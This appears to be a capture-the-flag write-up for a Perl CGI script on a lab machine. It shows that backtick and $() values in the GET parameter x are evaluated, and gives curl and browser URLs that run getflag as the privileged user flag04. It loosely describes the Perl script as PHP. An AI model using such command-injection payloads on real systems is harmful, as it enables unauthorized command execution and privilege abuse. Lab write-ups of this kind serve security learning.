In /home we find a .pl which is a web server in php managed by apache
In the file we see that it is served on localhost:4747

=> this perl script prints the parameter x of a GET request on the port 4747
curl http://localhost:4747?x=12
12


the perl script is executed with flag04 permissions : -r-xr-x---+ 1 flag04 level04 152 Jun 19 14:18 level04.pl
the command : curl localhost:4747?x=\`getflag\` executes getflag as user flag04
the backquotes get the command evaluated inside the program as would do the command : echo `ls`
it is important that the command is evaluated inside the program or else the getflag command will be executed as user level04

these commands work inside a webbrowser : 
http://192.168.56.2:4747/?x=`getflag`
http://192.168.56.2:4747/?x=$(getflag)
